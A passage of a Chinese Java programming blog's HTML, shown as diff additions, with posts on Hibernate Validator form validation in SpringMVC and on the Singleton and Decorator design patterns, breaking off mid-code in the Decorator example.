+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在 SpringMVC 项目中，有时需要对前端页面上传的表单参数进行一定的限制，包括不为空或者长度等。在控制器的各种方法中进行诸如如下方式的判断势必造成大量重复的代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">null</span> != username &amp;&amp; (!username.isEmpty())&#123;</span><br><span class="line">  ......</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>( <span class="keyword">null</span> != password &amp;&amp; (!password.isEmpty())&#123;</span><br><span class="line">  ......</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>( <span class="keyword">null</span> != phone &amp;&amp; (!phone.isEmpty())&#123;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p>
+<h2 id="Bean-Validator"><a href="#Bean-Validator" class="headerlink" title="Bean Validator"></a>Bean Validator</h2><p>Bean Validation 为 JavaBean 验证定义了相应的元数据模型和 API。缺省的元数据是 Java Annotations，通过使用 XML 可以对原有的元数据信息进行覆盖和扩展。在应用程序中，通过使用 Bean Validation 或是你自己定义的 constraint，例如 @NotNull, @Max, @ZipCode， 就可以确保数据模型（JavaBean）的正确性。constraint 可以附加到字段，getter 方法，类或者接口上面。对于一些特定的需求，用户可以很容易的开发定制化的 constraint。Bean Validation 是一个运行时的数据验证框架，在验证之后验证的错误信息会被马上返回。</p>
+<p>这里我们使用 Hibernate Validator 作为上述问题的解决方案</p>
+<h2 id="SpringMVC-中使用-Hibernate-Validator"><a href="#SpringMVC-中使用-Hibernate-Validator" class="headerlink" title="SpringMVC 中使用 Hibernate Validator"></a>SpringMVC 中使用 Hibernate Validator</h2><p>在合适的位置新建一个 ValidatorConfig 类，以 Java Config 的方式对 LocalFactoryBean 进行配置</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.hibernate.validator.HibernateValidator;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.validation.beanvalidation.LocalValidatorFactoryBean;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 配置 Hibernate Validator</span></span><br><span class="line"><span class="comment"> * Created by James on 17-12-2.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ValidatorConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Bean</span>(name = <span class="string">"validator"</span>)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> LocalValidatorFactoryBean <span class="title">getValidator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    LocalValidatorFactoryBean bean = <span class="keyword">new</span> LocalValidatorFactoryBean();</span><br><span class="line">    bean.setProviderClass(HibernateValidator.class);</span><br><span class="line">    <span class="keyword">return</span> bean;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="定义-Java-Bean-实体类"><a href="#定义-Java-Bean-实体类" class="headerlink" title="定义 Java Bean 实体类"></a>定义 Java Bean 实体类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Setter;</span><br><span class="line"><span class="keyword">import</span> me.zbl.fullstack.consts.DataConsts;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.validator.constraints.Length;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.validator.constraints.NotEmpty;</span><br><span class="line"></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@Setter</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserRegisterForm</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Length</span>(max = <span class="number">10</span>)</span><br><span class="line">    <span class="meta">@NotEmpty</span>(message = <span class="string">"用户名不能为空"</span>)</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="meta">@Length</span>(max = <span class="number">10</span>)</span><br><span class="line">    <span class="meta">@NotEmpty</span>(message = <span class="string">"密码不能为空"</span>)</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="meta">@NotEmpty</span>(message = <span class="string">"请再次确认密码"</span>)</span><br><span class="line">    <span class="keyword">private</span> String confirmpassword;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Bean-Validation-中内置的约束注解"><a href="#Bean-Validation-中内置的约束注解" class="headerlink" title="Bean Validation 中内置的约束注解"></a>Bean Validation 中内置的约束注解</h2><p>@Null   被注释的元素必须为 null<br>@NotNull    被注释的元素必须不为 null<br>@AssertTrue     被注释的元素必须为 true<br>@AssertFalse    被注释的元素必须为 false<br>@Min(value)     被注释的元素必须是一个数字，其值必须大于等于指定的最小值<br>@Max(value)     被注释的元素必须是一个数字，其值必须小于等于指定的最大值<br>@DecimalMin(value)  被注释的元素必须是一个数字，其值必须大于等于指定的最小值<br>@DecimalMax(value)  被注释的元素必须是一个数字，其值必须小于等于指定的最大值<br>@Size(max=, min=)   被注释的元素的大小必须在指定的范围内<br>@Digits (integer, fraction)     被注释的元素必须是一个数字，其值必须在可接受的范围内<br>@Past   被注释的元素必须是一个过去的日期<br>@Future     被注释的元素必须是一个将来的日期<br>@Pattern(regex=,flag=)  被注释的元素必须符合指定的正则表达式    </p>
+<p>Hibernate Validator 附加的 constraint<br>@NotBlank(message =)   验证字符串非null，且长度必须大于0<br>@Email  被注释的元素必须是电子邮箱地址<br>@Length(min=,max=)  被注释的字符串的大小必须在指定的范围内<br>@NotEmpty   被注释的字符串的必须非空<br>@Range(min=,max=,message=)  被注释的元素必须在合适的范围内</p>
+<h2 id="在-Controller-中对参数绑定结果进行验证"><a href="#在-Controller-中对参数绑定结果进行验证" class="headerlink" title="在 Controller 中对参数绑定结果进行验证"></a>在 Controller 中对参数绑定结果进行验证</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 表单提交</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="meta">@PostMapping</span>(<span class="string">"/register.form"</span>)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">fFrontUserRegister</span><span class="params">(@Valid UserRegisterForm registerForm, BindingResult bindingResult)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (bindingResult.hasErrors()) &#123;</span><br><span class="line">      List&lt;ObjectError&gt; errors = bindingResult.getAllErrors();</span><br><span class="line">      <span class="comment">// 此处可以对 errors 进行遍历获取错误消息</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">      ......</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="/2017/11/29/2017-11-29-面向对象软件设计模式-单例-Singleton/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="摆码王子">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="James' Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/11/29/2017-11-29-面向对象软件设计模式-单例-Singleton/" itemprop="url">面向对象软件设计模式-单例 Singleton</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-29T12:00:00+08:00">
+                2017-11-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>单例(Singleton)应该是开发者们最熟悉的设计模式了，并且好像也是最容易实现的——基本上每个开发者都能够随手写出——但是，真的是这样吗？<br>作为一个Java开发者，也许你觉得自己对单例模式的了解已经足够多了。我并不想危言耸听说一定还有你不知道的——毕竟我自己的了解也的确有限，但究竟你自己了解的程度到底怎样呢？往下看，我们一起来聊聊看~</p>
+<h2 id="什么是单例？"><a href="#什么是单例？" class="headerlink" title="什么是单例？"></a>什么是单例？</h2><p>单例对象的类必须保证只有一个实例存在——这是维基百科上对单例的定义，这也可以作为对意图实现单例模式的代码进行检验的标准。</p>
+<blockquote>
+<ul>
+<li>保证一个类仅有一个实例， 并提供一个访问它的全局访问点。让类自身负责保存它的唯一实例。</li>
+<li>这个类可以保证没有其他实例可以被创建（通过截取创建新对象的请求 ）， 并且它可以提供一个访问该实例的方法</li>
+</ul>
+</blockquote>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><blockquote>
+<p>在一部电影中，导演的作用是至关重要的，通常一部电影只有一个总导演。在电影的拍摄过程中，可能会设计多个片场，导演需要对不同的演员进行分别指导，但所有演员导演都是同一个人，“把导演叫过来” 这个过程可以视为单例模式获取实例的过程</p>
+</blockquote>
+<h2 id="模式分析"><a href="#模式分析" class="headerlink" title="模式分析"></a>模式分析</h2><blockquote>
+<p>先来看最简单的写法</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Single</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Single instance;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Single <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> Single();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>稍作修改，把构造器改为私有的，防止被外部的类调用</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>每次获取实例对象之前先进行判空，如果对象为 null 则实例化一个 instance，如果存在则直接返回该实例。这种方法表面上看是完美的，仿佛实例只存在一个。但是，在多线程运行的时候，如果两个不同的线程同时运行到判空操作，会各自分别创建一个实例，这样一来，这种方法就不是单例了</p>
+</blockquote>
+<blockquote>
+<p>在 getInstance() 方法上添加 synchronized 关键字</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这样写保证了 getInstance 方法同一时刻只会有一个线程执行，但是这样做会使得除了执行这个方法的线程顺利执行外，其他所有线程都要等待，这会造成极大的系统开销，降低了程序的运行效率</p>
+</blockquote>
+<blockquote>
+<p>这种方法代价过高，因为无论 instance 是否为 null ,每次执行时，整个方法都加上了锁，我们不妨将锁的范围尽可能的缩小，把对性能的影响降到最低，于是有了如下写法</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>只有当 instance 为 null 的时候才执行同步代码块，二次判空保证了不会产生多个实例</p>
+</blockquote>
+<blockquote>
+<p>这样看似没问题了，但是在计算机中，有时为了提高运行效率，会对指令进行重拍，比如</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a;      <span class="comment">//语句 A</span></span><br><span class="line">a = <span class="number">3</span>;      <span class="comment">//语句 B</span></span><br><span class="line"><span class="keyword">int</span> b = <span class="number">5</span>;      <span class="comment">//语句 C</span></span><br><span class="line"><span class="keyword">int</span> c = a + b;  <span class="comment">//语句 D</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>可能会被重排成 A-C-B-D 或者 C-A-B-D</p>
+<p>语句 C 和语句 D 不具备原子性，因此也有可能被重排<br>getInstance 操作如果被重排，那么 instance 会存在一种 “不为 null 但是仍然未被初始化” 的状态，即已经给 instance 分配了内存空间但是并没有调用 Singleton 的构造方法来初始化 instance，执行判空的线程抢在了初始化的操作完成之前，则直接返回 instance 肯定会报错</p>
+<p>于是有了最终版本，添加 volatile 关键字</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton instance;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>volatile 关键字具有屏蔽指令重排的功能，即对 instance 加上了一把锁，在完成写操作之前不会允许其他线程进行读操作，因此，在初始化完成前，无法对其进行读操作</p>
+</blockquote>
+<blockquote>
+<p>枚举类型是线程安全的，因此采用枚举类作为单例模式的一种实现是非常方便的</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> Singleton &#123;</span><br><span class="line">    INSTANCE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>通过枚举类获取单例的实例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Singleton result = Singleton.INSTANCE;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<h3 id="知识点：什么时候是类装载时？"><a href="#知识点：什么时候是类装载时？" class="headerlink" title="知识点：什么时候是类装载时？"></a>知识点：什么时候是类装载时？</h3><blockquote>
+<p>前面提到了单例在类装载时被实例化，那究竟什么时候才是『类装载时』呢？</p>
+</blockquote>
+<blockquote>
+<p>不严格的说，大致有这么几个条件会触发一个类被加载：</p>
+<ol>
+<li>new一个对象时</li>
+<li>使用反射创建它的实例时</li>
+<li>子类被加载时，如果父类还没被加载，就先加载父类</li>
+<li>jvm启动时执行的主类会首先被加载</li>
+</ol>
+</blockquote>
+<h2 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h2><blockquote>
+<ul>
+<li>类只能有一个实例而且客户可以从一个众所周知的访问点访问它</li>
+<li>这个唯一实例应该是通过子类化可扩展的， 并且客户应该无需更改代码就能使用一个扩展的实例</li>
+</ul>
+</blockquote>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>可能我们在实际的开发中，对单例的实现并没有那么严格的要求。比如，我如果能保证所有的getInstance都是在一个线程的话，那其实第一种最简单的教科书方式就够用了。再比如，有时候，我的单例变成了多例也可能对程序没什么太大影响。但是，如果我们能了解更多其中的细节，那么如果哪天程序出了些问题，我们起码能多一个排查问题的点。</p>
+<h2 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h2><p>本人创建的关于各种设计模式的开源项目：<a href="https://github.com/JamesZBL/java_design_patterns" target="_blank" rel="noopener">Java 实现的面向对象软件设计模式</a>  ，如果觉得有用，欢迎 Star/Fork/提Issue。该项目目前处在开发阶段。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="/2017/10/02/2017-10-02-面向对象软件设计模式-装饰器-Decorator/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="摆码王子">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="James' Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/10/02/2017-10-02-面向对象软件设计模式-装饰器-Decorator/" itemprop="url">面向对象软件设计模式-装饰器 Decorator</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-02T10:12:00+08:00">
+                2017-10-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h2><p>用于动态地给一个对象添加一些额外的职责。 就增加功能来说， Decorator模式相比生成子类更为灵活。装饰模式以对客户端透明的方式扩展对象的功能，是继承关系的一个替代方案。</p>
+<p>纯粹的装饰模式很难找到，大多数的装饰模式的实现都是“半透明”的，而不是完全透明的。换言之，允许装饰模式改变接口，增加新的方法。半透明的装饰模式是介于装饰模式和适配器模式之间的。适配器模式的用意是改变所考虑的类的接口，也可以通过改写一个或几个方法，或增加新的方法来增强或改变所考虑的类的功能。                                                                                     大多数的装饰模式实际上是半透明的装饰模式，这样的装饰模式也称做半装饰、半适配器模式。</p>
+<h2 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h2><p>以下情况使用Decorator模式</p>
+<ul>
+<li>在不影响其他对象的情况下， 以动态、 透明的方式给单个对象添加职责。</li>
+<li>处理那些可以撤消的职责。</li>
+<li>当不能采用生成子类的方法进行扩充时。 一种情况是， 可能有大量独立的扩展， 为支持每一种组合将产生大量的子类， 使得子类数目呈爆炸性增长。 另一种情况可能是因为类定义被隐藏， 或类定义不能用于生成子类。</li>
+</ul>
+<h2 id="模式要点"><a href="#模式要点" class="headerlink" title="模式要点"></a>模式要点</h2><p><img src="https://raw.githubusercontent.com/JamesZBL/java_design_patterns/master/decorator/uml/Decorator.png" alt=""></p>
+<h3 id="组成部分"><a href="#组成部分" class="headerlink" title="组成部分"></a>组成部分</h3><ul>
+<li>Component：定义一个对象接口， 可以给这些对象动态地添加职责。</li>
+<li>ConcreteComponent：定义一个对象， 可以给这个对象添加一些职责。</li>
+<li>Decorator：持有一个指向 Component 对象的引用，并定义一个与 Component 接口一致的接口。</li>
+<li>ConcreteDecorator：一向组件添加职责。</li>
+</ul>
+<h3 id="协作原理"><a href="#协作原理" class="headerlink" title="协作原理"></a>协作原理</h3><ul>
+<li>Decorator 将请求转发给它的 Component 对象， 并有可能在转发请求前后执行一些附加的动作。</li>
+</ul>
+<h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><p><img src="https://raw.githubusercontent.com/JamesZBL/java_design_patterns/master/decorator/uml/Decorator_impl.png" alt=""></p>
+<p>铁匠和木匠同时制作一把铁锤，第一种方案是木匠制作锤把，铁匠制作锤头；第二中方案是铁匠先制作锤把再制作锤头（假定这里的木匠只会制作锤把）。制作过程分为三部分：1.对材料进行初步的检查，2.进行制造并把部件安装起来以供后面的操作，3.完成之后再次进行检查，确保没有质量问题。</p>
+<p>首先定义“操作”接口，包括前后两次检查以及安装的操作。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 流水线上操作行为的接口</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Operation</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">checkBefore</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">join</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">chekcAfter</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>现在只由木匠制作锤把，定义一个木匠的操作类 CarpenterOperation<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 木匠的工作</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CarpenterOperation</span> <span class="keyword">implements</span> <span class="title">Operation</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(CarpenterOperation.class);</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkBefore</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    LOGGER.info(<span class="string">"检查木材"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">join</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    LOGGER.info(<span class="string">"打造锤把"</span>);</span><br><span class="line">  &#125;</span><br><span 